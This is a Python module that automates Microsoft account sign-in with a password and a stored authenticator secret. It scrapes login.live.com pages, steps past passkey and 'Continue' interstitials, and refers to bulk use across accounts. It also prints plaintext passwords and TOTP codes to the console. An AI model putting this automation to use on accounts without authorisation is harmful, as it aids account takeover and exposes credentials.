from securing.auth.handle_redirects import handle_redirects, submit_form, handle_fido
from securing.auth.polish_host import polish_host
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_pwd import login_pwd
from shared.gen_totp import totp

import logging
import httpx
import re


def _has_session(session: httpx.AsyncClient) -> bool:
    return (
        has_cookie(session, "__Host-MSAAUTH")
        or has_cookie(session, "__Host-MSAAUTHP")
        or has_cookie(session, "MSPAuth")
        or has_cookie(session, "WLSSC")
        or has_cookie(session, "AMCSecAuthJWT")
    )


def _extract_sft_urlpost(html: str) -> tuple[str | None, str | None]:
    sft = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
    url = re.search(r'"urlPost"\s*:\s*"(https://[^"]+)"', html)
    return (sft.group(1) if sft else None), (url.group(1) if url else None)


def _extract_totp_proof(html: str) -> str | None:
    """Find authenticator (type 10/14) proof data.

    Older MS pages used numeric data; newer pages use opaque tokens.
    The old regex required digits-only and silently failed.
    """
    # Prefer objects that explicitly declare type 10 or 14
    for obj in re.finditer(r"\{[^{}]+\}", html):
        chunk = obj.group(0)
        t = re.search(r'"type"\s*:\s*(\d+)', chunk)
        d = re.search(r'"data"\s*:\s*"((?:\\.|[^"])*)"', chunk)
        if t and d and int(t.group(1)) in (10, 14):
            return d.group(1)

    # Legacy order: data then type inside arrUserProofs
    m = re.search(
        r'"arrUserProofs"\s*:\s*\[(.*?)\]',
        html,
        re.DOTALL,
    )
    if not m:
        return None
    block = m.group(1)
    m2 = re.search(
        r'"data"\s*:\s*"((?:\\.|[^"])*)"[^{}]*?"type"\s*:\s*(?:10|14)'
        r'|"type"\s*:\s*(?:10|14)[^{}]*?"data"\s*:\s*"((?:\\.|[^"])*)"',
        block,
        re.DOTALL,
    )
    if not m2:
        return None
    return m2.group(1) or m2.group(2)


def _login_error_reason(html: str) -> str | None:
    lower = html.lower()
    if "doesn't exist" in lower or "doesnt exist" in lower or "CFFFFC15" in html:
        return "Microsoft account doesn't exist (or alias can't sign in)."
    if "password is incorrect" in lower or "80041012" in html:
        return "Password is incorrect."
    if "too many times" in lower:
        return "Microsoft rate-limited sign-in attempts — try again later."
    if "locked" in lower and "account" in lower:
        return "Account appears locked."
    err = re.search(r'"sErrTxt"\s*:\s*"((?:\\.|[^"])*)"', html)
    if err:
        # Strip simple HTML tags from MS error text
        txt = re.sub(r"<[^>]+>", "", err.group(1)).replace('\\"', '"')
        return txt[:200]
    return None


def _page_fingerprint(html: str) -> str:
    """Short markers for diagnosing unexpected post-password pages."""
    lower = (html or "").lower()
    title_m = re.search(r"<title[^>]*>(.*?)</title>", html or "", re.I | re.DOTALL)
    title = re.sub(r"\s+", " ", title_m.group(1)).strip()[:60] if title_m else "?"
    flags = []
    for needle, label in (
        ("arrUserProofs", "proofs"),
        ("interrupt/passkey", "passkey"),
        ("identity/confirm", "idconfirm"),
        ("privacynotice", "notice"),
        ("kmsi", "kmsi"),
        ("i5245", "i5245"),
        ("i5600", "i5600"),
        ("otc", "otc"),
        ("hip", "hip"),
        ("abuse", "abuse"),
        ("something went wrong", "sww"),
    ):
        if needle in lower or needle in (html or ""):
            flags.append(label)
    return f"title={title!r} flags={','.join(flags) or 'none'} len={len(html or '')}"


async def _try_pick_authenticator_proof(session: httpx.AsyncClient, html: str) -> str:
    """If MS shows 'other ways to sign in', switch to authenticator (type 10/14)."""
    if "arrUserProofs" in (html or "") and _extract_totp_proof(html):
        return html

    # Some pages list proofs but default to email/SMS — pick type 10/14 explicitly.
    proof = _extract_totp_proof(html or "")
    if proof:
        return html

    # Look for an auth-method switch URL / form that targets TOTP / authenticator app
    switch = (
        re.search(
            r'href="(https://login\.live\.com[^"]*(?:authMethod|otc|totp|Proof)[^"]*)"',
            html or "",
            re.I,
        )
        or re.search(
            r'"urlPost"\s*:\s*"(https://login\.live\.com[^"]+)"[^}]{0,400}"type"\s*:\s*(?:10|14)',
            html or "",
            re.DOTALL,
        )
    )
    if switch:
        try:
            resp = await session.get(switch.group(1).replace("&amp;", "&"), follow_redirects=True)
            return resp.text
        except Exception:
            logging.exception("authenticator proof switch GET failed")

    return html


async def _resolve_post_password_page(session: httpx.AsyncClient, html: str) -> str:
    """Follow Continue/passkey/pprid interstitials until a stable login page."""
    current = html
    for _ in range(8):
        if "arrUserProofs" in current and _extract_totp_proof(current):
            return current
        if _has_session(session) and 'complete-sso' in current.lower():
            return current

        action_match = re.search(r'action="([^"]+)"', current)
        action = action_match.group(1) if action_match else ""

        # JSON-escaped passkey interrupt (action= may be missing / encoded)
        if "interrupt/passkey" in current and "interrupt/passkey" not in action:
            enc = re.search(
                r'action=\\?"(https:[^"\\]*interrupt/passkey[^"\\]*)\\?"',
                current,
            ) or re.search(
                r'(https://login\.live\.com/[^"\s]*interrupt/passkey[^"\s]*)',
                current,
            )
            if enc:
                action = enc.group(1).replace("\\u0026", "&").replace("&amp;", "&")

        # Auto-submit Continue form → interrupt/passkey
        if "interrupt/passkey" in action or (
            "fmHF" in current and "pprid" in current and "interrupt/passkey" in current
        ):
            print("[~] - Handling passkey interrupt (post-password)")
            try:
                page = await submit_form(session, action, current)
                if "postBackUrl" in page:
                    page = await handle_fido(session, page)
                current = page if isinstance(page, str) else current
                continue
            except Exception:
                logging.exception("passkey interrupt handling failed")
                break

        # Generic pprid Continue forms
        if "pprid" in current and "ipt" in current and action:
            try:
                handled = await handle_redirects(session, current)
                if isinstance(handled, dict) and handled.get("urlPost"):
                    # Rebuild a minimal page marker — caller uses polish on dict path
                    return current
                if isinstance(handled, str):
                    current = handled
                    continue
            except Exception:
                logging.exception("handle_redirects failed during authpwd")
                break

        switched = await _try_pick_authenticator_proof(session, current)
        if switched != current:
            current = switched
            continue

        break

    return current


async def _finish_with_polish(session: httpx.AsyncClient, html: str) -> bool:
    sft, url_post = _extract_sft_urlpost(html)
    if not sft or not url_post:
        # Maybe handle_redirects already produced polishable data
        handled = await handle_redirects(session, html)
        if isinstance(handled, dict) and handled.get("urlPost") and handled.get("ppft"):
            print("[~] - Polishing MSAAUTH (from redirect handler)")
            await polish_host(session, handled)
            return _has_session(session)
        return _has_session(session)

    print("[~] - Polishing MSAAUTH")
    try:
        await polish_host(session, {"urlPost": url_post, "ppft": sft})
    except Exception:
        logging.exception("polish_host failed — checking session cookies anyway")
        # Direct KMSI-style finish as fallback (same payload polish uses)
        try:
            await session.post(
                url_post,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=f"PPFT={sft}&canary=&LoginOptions=1&type=28&hpgrequestid=&ctx=",
                follow_redirects=True,
            )
        except Exception:
            logging.exception("KMSI fallback post failed")

    return _has_session(session)


async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict) -> bool | str:
    """Login with password + authenticator TOTP.

    Returns True on success, or an error reason string on failure.
    (Callers treat any non-True value as failure.)
    """
    secret = data["auth_secret"]
    password = data["password"]

    print(f"password: {password}")

    live_data = await livedata(session)
    pwd_login = await login_pwd(
        session,
        email,
        live_data["urlPost"],
        password,
        live_data["ppft"],
    )
    logging.info("Password login response: %s", pwd_login[:800])

    hard = _login_error_reason(pwd_login)
    if hard and ("incorrect" in hard.lower() or "doesn't exist" in hard.lower() or "doesnt exist" in hard.lower()):
        print(f"[X] - {hard}")
        return hard

    # Resolve passkey / Continue interstitials that appear BEFORE the TOTP page.
    # Without this, bulk 2FA falsely reports "invalid credentials".
    page = await _resolve_post_password_page(session, pwd_login)

    sft, url_post = _extract_sft_urlpost(page)
    proof_data = _extract_totp_proof(page)

    # Some accounts finish password login on a passkey/KMSI page (i5245) with
    # no TOTP challenge. polish_host / type=28 completes the session.
    if not proof_data:
        if _has_session(session):
            print("[+] - Session already established after password (no TOTP challenge)")
            if sft and url_post:
                await _finish_with_polish(session, page)
            return True if _has_session(session) else "Login finished without TOTP but session cookies missing."

        if sft and url_post:
            print("[~] - No TOTP proof on page — trying KMSI/passkey finish")
            ok = await _finish_with_polish(session, page)
            if ok:
                print("[+] - Logged in without TOTP challenge (passkey/KMSI path)")
                return True

        fp = _page_fingerprint(page)
        logging.warning(
            "authpwd no TOTP after password for %s — %s snippet=%r",
            email,
            fp,
            (page or "")[:500],
        )
        reason = _login_error_reason(page) or (
            "Password accepted but Microsoft did not show an authenticator challenge "
            f"(passkey interrupt / unexpected page; {fp}). TOTP was not requested."
        )
        print(f"[X] - {reason}")
        return reason

    tcode = await totp(secret)
    if not tcode:
        return "Invalid authenticator secret (could not generate TOTP)."

    print(f"totp: {tcode}")
    if not sft or not url_post:
        return "Authenticator page missing sFT/urlPost after password login."

    auth_post = await session.post(
        url=url_post,
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        data={
            "otc": tcode,
            "AddTD": "true",
            "SentProofIDE": proof_data,
            "GeneralVerify": "false",
            "PPFT": sft,
            "canary": "",
            "sacxt": "1",
            "hpgrequestid": "",
            "hideSmsInMfaProofs": "false",
            "type": "19",
            "login": email,
            "infoPageShown": "0",
        },
        follow_redirects=True,
    )
    logging.info("Auth login response: %s", auth_post.text[:800])

    after = auth_post.text
    hard = _login_error_reason(after)
    if hard and "incorrect" in hard.lower():
        # Wrong TOTP often surfaces as generic identity errors
        return f"Authenticator code rejected — {hard}"

    # Post-TOTP may still hit passkey / notice forms
    after = await _resolve_post_password_page(session, after)

    url_post2 = re.search(r'"urlPost"\s*:\s*"([^"]+)"', after)
    if url_post2:
        sft2 = re.search(r'"sFT"\s*:\s*"([^"]+)"', after)
        print("[~] - Polishing MSAAUTH")
        await polish_host(
            session,
            {
                "urlPost": url_post2.group(1),
                "ppft": sft2.group(1) if sft2 else sft,
            },
        )
        return True if _has_session(session) else "TOTP accepted but polish did not establish session."

    handled = await handle_redirects(session, after)
    if isinstance(handled, dict) and handled.get("urlPost"):
        print("[~] - Polishing MSAAUTH")
        await polish_host(session, handled)
        return True if _has_session(session) else "Redirect handled but session cookies missing."

    if _has_session(session):
        return True

    print("[X] - Failed to get MSAAUTH after TOTP")
    return _login_error_reason(after) or "Login failed after authenticator code (no MSAAUTH session)."
